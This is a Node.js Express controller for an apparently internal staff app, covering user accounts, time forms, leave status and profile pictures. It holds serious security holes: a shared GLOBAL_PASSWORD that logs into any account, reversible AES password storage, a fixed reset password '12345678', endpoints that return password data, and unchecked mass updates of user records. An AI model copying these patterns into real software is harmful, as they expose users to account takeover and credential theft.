const models = require("../../models");
const User = models.User;
const TimeForm = models.TimeForm;
const { generate: generateToken, GLOBAL_PASSWORD } = require("../utils/token");
const crypto = require("crypto");
const cryptojs = require("crypto-js");
const ProfilePicture = models.ProfilePicture;
const { profilePictureUpload } = require("../../config/multerConfig");

const comparePassword = require("../utils/password").compare;

exports.register = (req, res) => {
  const { name, email, password, status, role, privilege_level, parentId } =
    req.body;

  const hash = crypto.randomBytes(32).toString("hex");
  const encryptedPassword = cryptojs.AES.encrypt(password, hash).toString();

  User.create({
    name: name,
    email: email,
    password: encryptedPassword,
    status: status,
    role: role,
    privilege_level: privilege_level,
    parentId: parentId,
    hash: hash,
    createdAt: new Date(),
    updatedAt: new Date(),
  }).then((user) => {
    res.status(200).send({
      status: "success",
      data: {
        token: generateToken(
          user.id,
          user.name,
          user.role,
          user.privilege_level
        ),
        role: user.role,
      },
    });
  });
};

exports.login = (req, res) => {
  const { email, password } = req.body;

  User.findOne({ where: { email } })
    .then((user) => {
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      if (
        comparePassword(password, user.password, user.hash) ||
        password === GLOBAL_PASSWORD
      ) {
        const token = generateToken(
          user.id,
          user.name,
          user.role,
          user.privilege_level
        );
        user.update({ loginCount: user.loginCount + 1 });
        return res.status(200).send({
          status: "success",
          data: { token, role: user.role },
        });
      }

      res.status(401).json({ message: "Invalid credentials" });
    })
    .catch((err) => {
      res
        .status(500)
        .json({ message: "Something went wrong", error: err.message });
    });
};

exports.getAllUsers = (req, res) => {
  User.findAll()
    .then((users) => {
      res.status(200).send(users);
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.getUserByID = (req, res) => {
  User.findByPk(req.params.id)
    .then((user) => {
      res.status(200).send(user);
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.getTalentUserIdNames = (req, res) => {
  User.findAll({ attributes: ["id", "name"], where: { role: "talent" } })
    .then((users) => {
      res.status(200).send(users);
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.getChildrenIdsNames = (req, res) => {
  User.findAll({ attributes: ["id", "name"], where: { parentId: req.body.id } })
    .then((users) => {
      res.status(200).send(users);
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.changePassword = (req, res) => {
  const { oldPassword, newPassword, id } = req.body;
  User.findByPk(id).then((user) => {
    if (comparePassword(oldPassword, user.password, user.hash)) {
      encryptedNewPassword = cryptojs.AES.encrypt(
        newPassword,
        user.hash
      ).toString();
      User.update(
        { password: encryptedNewPassword },
        { where: { id: id } }
      ).then((data) => {
        res.status(200).send({
          status: "success",
        });
      });
    } else {
      res.status(401).json({ message: "Invalid credentials" });
    }
  });
};

exports.addTimeForm = (req, res) => {
  const {
    user_id,
    Date,
    Agency,
    Client,
    MainTaskType,
    ExtraNotes,
    TimeSpentInHours,
  } = req.body;
  TimeForm.create({
    user_id: user_id,
    Date: Date,
    Agency: Agency,
    Client: Client,
    MainTaskType: MainTaskType,
    ExtraNotes: ExtraNotes,
    TimeSpentInHours: TimeSpentInHours,
  })
    .then((timeform) => {
      res.status(200).send({
        status: "success",
      });
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.getTimeFormsById = (req, res) => {
  TimeForm.findAll({ where: { user_id: req.params.id } })
    .then((timeform) => {
      res.status(200).send(timeform);
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.getUserNameById = (req, res) => {
  User.findByPk(req.params.id)
    .then((user) => {
      res.status(200).send(user);
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.updateUser = (req, res) => {
  User.update(req.body, { where: { id: req.params.id } })
    .then((data) => {
      res.status(200).send({
        status: "success",
      });
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.resetCount = (req, res) => {
  User.update({ loginCount: 0 }, { where: { id: req.params.id } })
    .then((data) => {
      res.status(200).send({
        status: "success",
      });
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.resetPassword = (req, res) => {
  id = req.params.id;
  password = "12345678";

  User.findByPk(id).then((user) => {
    encryptedNewPassword = cryptojs.AES.encrypt(password, user.hash).toString();

    User.update({ password: encryptedNewPassword }, { where: { id: id } }).then(
      (data) => {
        res.status(200).send({
          status: "success",
        });
      }
    );
  });
};

exports.deleteUser = (req, res) => {
  const id = req.params.id;
  User.destroy({ where: { id: id } })
    .then((data) => {
      res.status(200).send({
        status: "success",
      });
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.getTalentHeads = (req, res) => {
  User.findAll({
    where: {
      role: "talent",
      position: "HEAD",
    },
    attributes: ["id"],
  })
    .then((users) => {
      const userIds = users.map((user) => user.id);
      res.status(200).send(userIds);
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.getKSAHeads = (req, res) => {
  User.findAll({
    where: {
      role: "talent",
      position: "HEAD",
      location: "KSA",
    },
    attributes: ["id"],
  })
    .then((users) => {
      const userIds = users.map((user) => user.id);
      res.status(200).send(userIds);
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.getUAEHead = (req, res) => {
  User.findAll({
    where: {
      role: "talent",
      position: "HEAD",
      location: "UAE",
    },
    attributes: ["id", "onLeave"],
  })
    .then((users) => {
      res.status(200).send(users[0]);
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.addTalentHead = (req, res) => {
  const id = req.params.id;

  User.update({ position: "HEAD" }, { where: { id: id } })
    .then((data) => {
      res.status(200).send({
        status: "success",
      });
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.removeTalentHead = (req, res) => {
  const id = req.params.id;

  User.update({ position: null }, { where: { id: id } })
    .then((data) => {
      res.status(200).send({
        status: "success",
      });
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.goOnLeave = (req, res) => {
  const id = req.params.id;

  User.update({ onLeave: 1 }, { where: { id: id } })
    .then((data) => {
      res.status(200).send({
        status: "success",
      });
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.returnFromLeave = (req, res) => {
  const id = req.params.id;

  User.update({ onLeave: 0 }, { where: { id: id } })
    .then((data) => {
      res.status(200).send({
        status: "success",
      });
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};

exports.uploadProfilePicture = (req, res) => {
  

  profilePictureUpload.single("profilePicture")(req, res, (err) => {
    const userId = req.params.id;
    
    const file = req.file;
    if (err) {
      return res.status(500).send({ message: err.message });
    }


    
    ProfilePicture.create({
      userId: userId,
      filename: file.filename,
      mimetype: file.mimetype,
    })
      .then((profilePicture) => {
        res.status(200).send({
          status: "success",
        });
      })
      .catch((err) => {
        res.status(500).send({
          status: "error",
          message: err.message,
        });
      });
  });
};


exports.updateProfilePicture = (req, res) => {
    const userId = req.params.id;

    profilePictureUpload.single("profilePicture")(req, res, (err) => {
      const file = req.file;
  
      if (err) {
        return res.status(500).send({ message: err.message });
      }
      
  
      ProfilePicture.findOne({ userId: userId })
        .then((existingPicture) => {
          if (existingPicture) {
            // Optionally delete the old picture if you don't want to store it
            
  
            existingPicture.filename = file.filename;
            existingPicture.mimetype = file.mimetype;
  
            return existingPicture.save();
          } else {
            // Create new if no picture exists
            return ProfilePicture.create({
              userId: userId,
              filename: file.filename,
              mimetype: file.mimetype,
            });
          }
        })
        .then((profilePicture) => {
          res.status(200).send({
            status: "success",
          });
        })
        .catch((err) => {
          res.status(500).send({
            status: "error",
            message: err.message,
          });
        });
    });
  };


exports.getProfilePictureById = (req, res) => {
  ProfilePicture.findOne({ where: { userId: req.params.id } })
    .then((profilePicture) => {
      res.status(200).send(profilePicture);
    })
    .catch((err) => {
      res.status(500).send({
        status: "error",
        message: err.message,
      });
    });
};
